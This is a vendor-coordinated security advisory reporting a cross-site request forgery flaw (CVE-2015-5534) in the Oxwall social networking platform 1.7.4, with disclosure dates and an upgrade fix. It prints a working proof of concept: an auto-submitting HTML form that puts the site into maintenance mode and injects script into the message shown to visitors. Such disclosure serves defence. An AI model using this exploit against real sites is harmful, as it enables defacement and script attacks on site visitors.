@@ -1,0 +1,58 @@
+Advisory ID: HTB23266
+Product: Oxwall
+Vendor: http://www.oxwall.org
+Vulnerable Version(s): 1.7.4 and probably prior
+Tested Version: 1.7.4
+Advisory Publication:  July 1, 2015  [without technical details]
+Vendor Notification: July 1, 2015 
+Vendor Patch: September 8, 2015 
+Public Disclosure: October 22, 2015 
+Vulnerability Type: Cross-Site Request Forgery [CWE-352]
+CVE Reference: CVE-2015-5534
+Risk Level: High 
+CVSSv3 Base Score: 7.1 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L]
+Solution Status: Fixed by Vendor
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge Security Research Lab discovered vulnerability in Oxwall, which can be exploited to perform CSRF (Cross-Site Request Forgery) attacks. An attacker might be able to put the website under maintenance and perform XSS attacks against website visitors.
+
+The vulnerability exists due to failure in the "/admin/pages/maintenance" script to properly verify the source of the HTTP request. A remote attacker can trick a logged-in administrator to visit a page with CSRF exploit and put the entire website under maintenance. Additionally, the attacker is able to inject arbitrary HTML and JavaScript code into maintenance message and execute it in browsers of any website visitor. Successful exploitation of this vulnerability may allow an attacker to steal other users’ cookies, spread malware to website visitors, and even obtain full control over vulnerable website. 
+
+A simple CSRF exploit below puts the website under maintenance and displays a JS popup with "ImmuniWeb" word to every website visitor:
+
+
+<form action = "http://[host]/admin/pages/maintenance" method = "POST">
+<input type="hidden" name="form_name" value="maintenance">
+<input type="hidden" name="maintenance_enable" value="on">
+<input type="hidden" name="save" value="Save">
+<input type="hidden" name="maintenance_text" value="<script>alert('ImmuniWeb');</script>">
+<input value="submit" id="btn" type="submit" />
+</form>
+<script>
+document.getElementById('btn').click();
+</script>
+
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Update to Oxwall 1.8
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23266 - https://www.htbridge.com/advisory/HTB23266 - Cross-Site Request Forgery on Oxwall.
+[2] Oxwall - http://www.oxwall.org/ - Oxwall® is unbelievably flexible and easy to use PHP/MySQL social networking software platform.
+[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
+[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
+[5] ImmuniWeb® SaaS - https://www.htbridge.com/immuniweb/ - hybrid of manual web application penetration test and cutting-edge vulnerability scanner available online via a Software-as-a-Service (SaaS) model.
+
+-----------------------------------------------------------------------------------------------
+
+Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
